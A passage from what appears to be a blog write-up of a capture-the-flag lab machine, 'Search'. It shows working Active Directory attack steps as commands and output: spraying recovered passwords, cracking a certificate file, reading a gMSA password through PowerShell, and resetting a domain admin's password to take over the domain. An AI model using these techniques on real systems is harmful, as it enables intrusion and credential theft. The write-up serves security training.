+  adding: xl/calcChain.xml <span class="token punctuation">(</span>deflated <span class="token number">55</span>%<span class="token punctuation">)</span>
+  adding: xl/sharedStrings.xml <span class="token punctuation">(</span>deflated <span class="token number">55</span>%<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>By dragging the column D to the right we are able to see the passwords clear text.</p>
+<img src="/2022/05/01/search/20220501163926.png" class="">
+
+<p>-&gt; users list:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Payton.Harmon
+Cortez.Hickman
+Bobby.Wolf
+Margaret.Robinson
+Scarlett.Parks
+Eliezer.Jordan
+Hunter.Kirby
+Sierra.Frye
+Annabelle.Wells
+Eve.Galvan
+Jeramiah.Fritz
+Abby.Gonzalez
+Joy.Costa
+Vincent.Sutton<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>-&gt; password list:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token number">36</span><span class="token operator">!</span>cried<span class="token operator">!</span>INDIA<span class="token operator">!</span>year<span class="token operator">!</span><span class="token number">50</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
+<span class="token punctuation">..</span><span class="token number">10</span>-time-TALK-proud-66<span class="token punctuation">..</span>
+??47^before^WORLD^surprise^91??
+//51+mountain+DEAR+noise+83//
+++47<span class="token operator">|</span>building<span class="token operator">|</span>WARSAW<span class="token operator">|</span>gave<span class="token operator">|</span><span class="token number">60</span>++
+<span class="token operator">!</span><span class="token operator">!</span>05_goes_SEVEN_offer_83<span class="token operator">!</span><span class="token operator">!</span>
+~~27%when%VILLAGE%full%00~~
+<span class="token variable">$$</span><span class="token number">49</span><span class="token operator">=</span>wide<span class="token operator">=</span>STRAIGHT<span class="token operator">=</span>jordan<span class="token operator">=</span><span class="token number">28</span><span class="token variable">$$</span><span class="token number">18</span>
+<span class="token operator">==</span><span class="token number">95</span>~pass~QUIET~austria~77<span class="token operator">==</span>
+//61<span class="token operator">!</span>banker<span class="token operator">!</span>FANCY<span class="token operator">!</span>measure<span class="token operator">!</span><span class="token number">25</span>//
+??40:student:MAYOR:been:66??
+<span class="token operator">&amp;&amp;</span><span class="token number">75</span>:major:RADIO:state:93<span class="token operator">&amp;&amp;</span>
+**30*venus*BALL*office*42**
+**24<span class="token operator">&amp;</span>moment<span class="token operator">&amp;</span>BRAZIL<span class="token operator">&amp;</span>members<span class="token operator">&amp;</span><span class="token number">66</span>**<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Let’s test the passwords</p>
+<img src="/2022/05/01/search/20220501164709.png" class="">
+
+<p>We got a hit on <strong>sierra.frye</strong><br>Let’s analyze ‘her’ on BloodHound to see if we have any data</p>
+<img src="/2022/05/01/search/20220501164943.png" class="">
+<p>As we can see ‘she’ is a member of ITSEC which is in the ITSEC group that can <em>ReadGMSAPassword</em> of the user <strong>BIR-ADFS-GMSA</strong> that has a <em>GenericAll</em> to TRISTAN.DAVIES that is a domain admin.</p>
+<p>Let’s connect to the SMB using the sierra account to see possbile new files that could help us.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smb: <span class="token punctuation">\</span>sierra.frye<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span>
+  <span class="token builtin class-name">.</span>                                  Dc        <span class="token number">0</span>  Wed Nov <span class="token number">17</span> <span class="token number">20</span>:01:46 <span class="token number">2021</span>
+  <span class="token punctuation">..</span>                                 Dc        <span class="token number">0</span>  Wed Nov <span class="token number">17</span> <span class="token number">20</span>:01:46 <span class="token number">2021</span>
+  Desktop                           DRc        <span class="token number">0</span>  Wed Nov <span class="token number">17</span> <span class="token number">20</span>:08:00 <span class="token number">2021</span>
+  Documents                         DRc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> <span class="token number">10</span>:42:19 <span class="token number">2020</span>
+  Downloads                         DRc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> <span class="token number">10</span>:45:36 <span class="token number">2020</span>
+  user.txt                           Ac       <span class="token number">33</span>  Wed Nov <span class="token number">17</span> <span class="token number">19</span>:55:27 <span class="token number">2021</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>In the <em>Downloads</em> folder we can find a certificate.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smb: <span class="token punctuation">\</span>sierra.frye<span class="token punctuation">\</span>Downloads<span class="token punctuation">\</span>Backups<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span>
+  <span class="token builtin class-name">.</span>                                 DHc        <span class="token number">0</span>  Mon Aug <span class="token number">10</span> <span class="token number">16</span>:39:17 <span class="token number">2020</span>
+  <span class="token punctuation">..</span>                                DHc        <span class="token number">0</span>  Mon Aug <span class="token number">10</span> <span class="token number">16</span>:39:17 <span class="token number">2020</span>
+  search-RESEARCH-CA.p12             Ac     <span class="token number">2643</span>  Fri Jul <span class="token number">31</span> <span class="token number">11</span>:04:11 <span class="token number">2020</span>
+  staff.pfx                          Ac     <span class="token number">4326</span>  Mon Aug <span class="token number">10</span> <span class="token number">16</span>:39:17 <span class="token number">2020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Let’s download it and see it.<br>Let’s try to import it on our browser</p>
+<img src="/2022/05/01/search/20220501170100.png" class="">
+
+<p>As you can see it’s asking for a password<br>So in order to bypass this we will use john the ripper and it’s modules to get a hash and then crack it.</p>
+<p><code>python3 /usr/share/john/pfx2john.py staff.pfx &gt; hashpfx.hash</code><br>Or to use a tool named <code>crackpkcs12</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ ./crackpkcs12 <span class="token parameter variable">-d</span> /usr/share/wordlists/rockyou.txt <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/staff.pfx                                                                                          
+
+Dictionary attack - Starting <span class="token number">12</span> threads
+
+*********************************************************
+Dictionary attack - Thread <span class="token number">1</span> - Password found: misspissy
+*********************************************************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Now we can try to load the certificate and try to access the <strong>&#x2F;Staff</strong> endpoint.<br>You will be prompted with this</p>
+<img src="/2022/05/01/search/20220501172034.png" class="">
+<p>Click yes and you will see a Windows PowerShell Web Access</p>
+<img src="/2022/05/01/search/20220501172059.png" class="">
+
+<p>Let’s connect with the sierra account and continue with the exploitation.</p>
+<img src="/2022/05/01/search/20220501172258.png" class="">
+<p>We got the Computer Name from the nmap scan.</p>
+<p>And we are logged in</p>
+<img src="/2022/05/01/search/20220501172345.png" class="">
+
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h3 id="ReadGMSAPassword"><a href="#ReadGMSAPassword" class="headerlink" title="ReadGMSAPassword"></a>ReadGMSAPassword</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> Get-ADServiceAccount BIR-ADFS-GMSA
+
+DistinguishedName <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>BIR-ADFS-GMSA,CN<span class="token operator">=</span>Managed Service Accounts,DC<span class="token operator">=</span>search,DC<span class="token operator">=</span>htb
+Enabled           <span class="token builtin class-name">:</span> True
+Name              <span class="token builtin class-name">:</span> BIR-ADFS-GMSA
+ObjectClass       <span class="token builtin class-name">:</span> msDS-GroupManagedServiceAccount
+ObjectGUID        <span class="token builtin class-name">:</span> 48cd6c5b-56cb-407e-ac2b-7294b5a44857
+SamAccountName    <span class="token builtin class-name">:</span> BIR-ADFS-GMSA$
+SID               <span class="token builtin class-name">:</span> S-1-5-21-271492789-1610487937-1871574529-1299
+UserPrincipalName <span class="token builtin class-name">:</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>No password here, let’s look on the advanced options.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> Get-ADServiceAccount BIR-ADFS-GMSA <span class="token parameter variable">-properties</span> *
+ 
+AccountExpirationDate                      <span class="token builtin class-name">:</span> 
+accountExpires                             <span class="token builtin class-name">:</span> <span class="token number">9223372036854775807</span>
+AccountLockoutTime                         <span class="token builtin class-name">:</span> 
+AccountNotDelegated                        <span class="token builtin class-name">:</span> False
+AllowReversiblePasswordEncryption          <span class="token builtin class-name">:</span> False
+AuthenticationPolicy                       <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+AuthenticationPolicySilo                   <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+BadLogonCount                              <span class="token builtin class-name">:</span> <span class="token number">0</span>
+badPasswordTime                            <span class="token builtin class-name">:</span> <span class="token number">132958846422914434</span>
+badPwdCount                                <span class="token builtin class-name">:</span> <span class="token number">0</span>
+CannotChangePassword                       <span class="token builtin class-name">:</span> False
+CanonicalName                              <span class="token builtin class-name">:</span> search.htb/Managed Service Accounts/BIR-ADFS-GMSA
+Certificates                               <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+CN                                         <span class="token builtin class-name">:</span> BIR-ADFS-GMSA
+codePage                                   <span class="token builtin class-name">:</span> <span class="token number">0</span>
+CompoundIdentitySupported                  <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>False<span class="token punctuation">&#125;</span>
+countryCode                                <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Created                                    <span class="token builtin class-name">:</span> <span class="token number">4</span>/9/2020 <span class="token number">10</span>:05:04 AM
+createTimeStamp                            <span class="token builtin class-name">:</span> <span class="token number">4</span>/9/2020 <span class="token number">10</span>:05:04 AM
+Deleted                                    <span class="token builtin class-name">:</span> 
+Description                                <span class="token builtin class-name">:</span> ADFS on Covid
+DisplayName                                <span class="token builtin class-name">:</span> 
+DistinguishedName                          <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>BIR-ADFS-GMSA,CN<span class="token operator">=</span>Managed Service Accounts,DC<span class="token operator">=</span>search,DC<span class="token operator">=</span>htb
+DNSHostName                                <span class="token builtin class-name">:</span> covid.search.htb
+DoesNotRequirePreAuth                      <span class="token builtin class-name">:</span> False
+dSCorePropagationData                      <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">1</span>/1/1601 <span class="token number">12</span>:00:00 AM<span class="token punctuation">&#125;</span>
+Enabled                                    <span class="token builtin class-name">:</span> True
+HomedirRequired                            <span class="token builtin class-name">:</span> False
+HomePage                                   <span class="token builtin class-name">:</span> 
+HostComputers                              <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+instanceType                               <span class="token builtin class-name">:</span> <span class="token number">4</span>
+isCriticalSystemObject                     <span class="token builtin class-name">:</span> False
+isDeleted                                  <span class="token builtin class-name">:</span> 
+KerberosEncryptionType                     <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>RC4, AES128, AES256<span class="token punctuation">&#125;</span>
+LastBadPasswordAttempt                     <span class="token builtin class-name">:</span> <span class="token number">5</span>/1/2022 <span class="token number">2</span>:17:22 PM
+LastKnownParent                            <span class="token builtin class-name">:</span> 
+lastLogoff                                 <span class="token builtin class-name">:</span> <span class="token number">0</span>
+lastLogon                                  <span class="token builtin class-name">:</span> <span class="token number">132958864600299789</span>
+LastLogonDate                              <span class="token builtin class-name">:</span> <span class="token number">5</span>/1/2022 <span class="token number">2</span>:47:40 PM
+lastLogonTimestamp                         <span class="token builtin class-name">:</span> <span class="token number">132958864600299789</span>
+localPolicyFlags                           <span class="token builtin class-name">:</span> <span class="token number">0</span>
+LockedOut                                  <span class="token builtin class-name">:</span> False
+logonCount                                 <span class="token builtin class-name">:</span> <span class="token number">25</span>
+ManagedPasswordIntervalInDays              <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">3650</span><span class="token punctuation">&#125;</span>
+MemberOf                                   <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+MNSLogonAccount                            <span class="token builtin class-name">:</span> False
+Modified                                   <span class="token builtin class-name">:</span> <span class="token number">5</span>/1/2022 <span class="token number">2</span>:47:40 PM
+modifyTimeStamp                            <span class="token builtin class-name">:</span> <span class="token number">5</span>/1/2022 <span class="token number">2</span>:47:40 PM
+msDS-GroupMSAMembership                    <span class="token builtin class-name">:</span> System.DirectoryServices.ActiveDirectorySecurity
+msDS-ManagedPasswordId                     <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">1</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span><span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span>
+msDS-ManagedPasswordInterval               <span class="token builtin class-name">:</span> <span class="token number">3650</span>
+msDS-SupportedEncryptionTypes              <span class="token builtin class-name">:</span> <span class="token number">28</span>
+msDS-User-Account-Control-Computed         <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Name                                       <span class="token builtin class-name">:</span> BIR-ADFS-GMSA
+nTSecurityDescriptor                       <span class="token builtin class-name">:</span> System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                             <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>ms-DS-Group-Managed-Service-Account,CN<span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>searc
+                                             h,DC<span class="token operator">=</span>htb
+ObjectClass                                <span class="token builtin class-name">:</span> msDS-GroupManagedServiceAccount
+ObjectGUID                                 <span class="token builtin class-name">:</span> 48cd6c5b-56cb-407e-ac2b-7294b5a44857
+objectSid                                  <span class="token builtin class-name">:</span> S-1-5-21-271492789-1610487937-1871574529-1299
+PasswordExpired                            <span class="token builtin class-name">:</span> False
+PasswordLastSet                            <span class="token builtin class-name">:</span> <span class="token number">4</span>/9/2020 <span class="token number">10</span>:05:04 AM
+PasswordNeverExpires                       <span class="token builtin class-name">:</span> False
+PasswordNotRequired                        <span class="token builtin class-name">:</span> False
+PrimaryGroup                               <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>Domain Computers,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>search,DC<span class="token operator">=</span>htb
+primaryGroupID                             <span class="token builtin class-name">:</span> <span class="token number">515</span>
+PrincipalsAllowedToDelegateToAccount       <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+PrincipalsAllowedToRetrieveManagedPassword <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>CN<span class="token operator">=</span>ITSec,OU<span class="token operator">=</span>Sites,DC<span class="token operator">=</span>search,DC<span class="token operator">=</span>htb<span class="token punctuation">&#125;</span>
+ProtectedFromAccidentalDeletion            <span class="token builtin class-name">:</span> False
+pwdLastSet                                 <span class="token builtin class-name">:</span> <span class="token number">132308967049540320</span>
+SamAccountName                             <span class="token builtin class-name">:</span> BIR-ADFS-GMSA$
+sAMAccountType                             <span class="token builtin class-name">:</span> <span class="token number">805306369</span>
+sDRightsEffective                          <span class="token builtin class-name">:</span> <span class="token number">0</span>
+ServicePrincipalNames                      <span class="token builtin class-name">:</span> 
+SID                                        <span class="token builtin class-name">:</span> S-1-5-21-271492789-1610487937-1871574529-1299
+SIDHistory                                 <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+TrustedForDelegation                       <span class="token builtin class-name">:</span> False
+TrustedToAuthForDelegation                 <span class="token builtin class-name">:</span> False
+UseDESKeyOnly                              <span class="token builtin class-name">:</span> False
+userAccountControl                         <span class="token builtin class-name">:</span> <span class="token number">4096</span>
+userCertificate                            <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+UserPrincipalName                          <span class="token builtin class-name">:</span> 
+uSNChanged                                 <span class="token builtin class-name">:</span> <span class="token number">232046</span>
+uSNCreated                                 <span class="token builtin class-name">:</span> <span class="token number">24951</span>
+whenChanged                                <span class="token builtin class-name">:</span> <span class="token number">5</span>/1/2022 <span class="token number">2</span>:47:40 PM
+whenCreated                                <span class="token builtin class-name">:</span> <span class="token number">4</span>/9/2020 <span class="token number">10</span>:05:04 AM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> Get-ADServiceAccount BIR-ADFS-GMSA <span class="token parameter variable">-properties</span> msDS-ManagedPassword
+
+
+DistinguishedName    <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>BIR-ADFS-GMSA,CN<span class="token operator">=</span>Managed Service Accounts,DC<span class="token operator">=</span>search,DC<span class="token operator">=</span>htb
+Enabled              <span class="token builtin class-name">:</span> True
+msDS-ManagedPassword <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">1</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span><span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span>
+Name                 <span class="token builtin class-name">:</span> BIR-ADFS-GMSA
+ObjectClass          <span class="token builtin class-name">:</span> msDS-GroupManagedServiceAccount
+ObjectGUID           <span class="token builtin class-name">:</span> 48cd6c5b-56cb-407e-ac2b-7294b5a44857
+SamAccountName       <span class="token builtin class-name">:</span> BIR-ADFS-GMSA$
+SID                  <span class="token builtin class-name">:</span> S-1-5-21-271492789-1610487937-1871574529-1299
+UserPrincipalName    <span class="token builtin class-name">:</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>So we get the attribute, now let’s try to extract it and store it in a variable because these type of passwords are very strong because they are in a hex bytes stream.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token variable">$gmsa</span> <span class="token operator">=</span> Get-ADServiceAccount BIR-ADFS-GMSA <span class="token parameter variable">-properties</span> msDS-ManagedPassword
+
+PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token variable">$mp</span> <span class="token operator">=</span> <span class="token variable">$gmsa</span><span class="token builtin class-name">.</span><span class="token string">'msDS-ManagedPassword'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>This is how the password is looking</p>
+<img src="/2022/05/01/search/20220501173221.png" class="">
+
+<p>Store the password:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$secpwd</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ConvertFrom-ADManagedPasswordBlob <span class="token variable">$mp</span><span class="token punctuation">)</span>.SecureCurrentPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Let’s create a <strong>credentials</strong> block in order to be easier to execute commands as a certain user.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$cred</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential <span class="token string">"BIR-ADFS-GMSA"</span>, <span class="token variable">$secpwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2022/05/01/search/20220501173640.png" class="">
+
+<p>Now let’s execute a command as the <strong>BIR-ADFS-GMSA</strong> user</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> Invoke-Command <span class="token parameter variable">-ComputerName</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-cred</span> <span class="token variable">$cred</span> <span class="token parameter variable">-SCriptBlock</span> <span class="token punctuation">&#123;</span> <span class="token function">whoami</span> <span class="token punctuation">&#125;</span>
+
+search<span class="token punctuation">\</span>bir-adfs-gmsa$
+PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Now we can do the <strong>GenericAll</strong> since we have access to the <strong>BIR</strong> account.<br>So we can try to change his password and do the same we did for the <strong>BIR</strong> acount in order to execute some commands.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> Invoke-Command <span class="token parameter variable">-ComputerName</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-cred</span> <span class="token variable">$cred</span> <span class="token parameter variable">-SCriptBlock</span> <span class="token punctuation">&#123;</span> net user Tristan.Davies PasSw0rd<span class="token operator">!</span> <span class="token punctuation">&#125;</span>
+The <span class="token builtin class-name">command</span> completed successfully.
+
+PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token variable">$secpwd</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token string">"PasSw0rd!"</span> <span class="token parameter variable">-AsPlainText</span> <span class="token parameter variable">-Force</span> 
+
+PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token variable">$credtwo</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential <span class="token string">"Tristan.Davies"</span>,<span class="token variable">$secpwd</span>
+
+PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token variable">$credtwo</span>
+
+UserName                           Password
+--------                           --------
+Tristan.Davies System.Security.SecureString
+
+PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> Invoke-Command <span class="token parameter variable">-ComputerName</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-cred</span> <span class="token variable">$credtwo</span> <span class="token parameter variable">-SCriptBlock</span> <span class="token punctuation">&#123;</span> <span class="token function">whoami</span> <span class="token punctuation">&#125;</span>
+search<span class="token punctuation">\</span>tristan.davies
+
+PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>So as we can see we got domain admin, we could try to get a reverse shell but in this case I didn’t want since we can read the root.txt with this PowerShell Web.<br>You could use the Nishand one liner or a custom powershell reverse tcp in order to do that.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sierra.Frye<span class="token punctuation">\</span>Documents<span class="token operator">></span> Invoke-Command <span class="token parameter variable">-ComputerName</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-cred</span> <span class="token variable">$credtwo</span> <span class="token parameter variable">-SCriptBlock</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">type</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>root.txt <span class="token punctuation">&#125;</span>
+c0c691bd78fa03f47cccae9ca5d897d2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2022/07/20/trick/" title="Trick"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Trick</span></a><a class="button is-default" href="/2021/12/12/unbr-sz2-2021/" title="Unbreakable Team"><span class="has-text-weight-semibold">Next: Unbreakable Team</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201/"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Ischyr</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><div style="margin-top: 2px"></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
